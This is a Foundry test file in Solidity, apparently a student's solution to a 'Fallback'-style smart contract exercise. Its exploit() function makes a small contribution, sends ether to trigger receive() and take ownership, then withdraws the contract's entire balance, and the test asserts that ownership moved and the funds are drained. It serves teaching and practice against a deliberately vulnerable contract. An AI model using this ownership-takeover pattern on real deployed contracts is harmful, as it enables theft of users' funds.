// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Assignment11.sol";

contract FallbackTest is Test {
    Assignment11 fallbackContract;
    address student;

    function setUp() public {
        student = vm.addr(1);
        vm.deal(student, 1 ether); // Fund student account
        fallbackContract = new Assignment11();
    }

    function exploit() internal {
        vm.startPrank(student);
        
        // Contribute a small amount (less than 0.001 ether) to the contract
        fallbackContract.contribute{value: 0.0003 ether}();
        // Send ether to the contract trigger receive() and become the owner
        (bool success, ) = address(fallbackContract).call{value: 0.0001 ether}("");


        // Withdraw all funds
        fallbackContract.withdraw();
        vm.stopPrank();
    }

    function testStudentSolution() public {
        exploit();
        
        verifySolution();
    }

    function verifySolution() internal {
        assertEq(fallbackContract.owner(), student, "Ownership not transferred");
        assertEq(address(fallbackContract).balance, 0, "Contract balance not drained");
    }
}
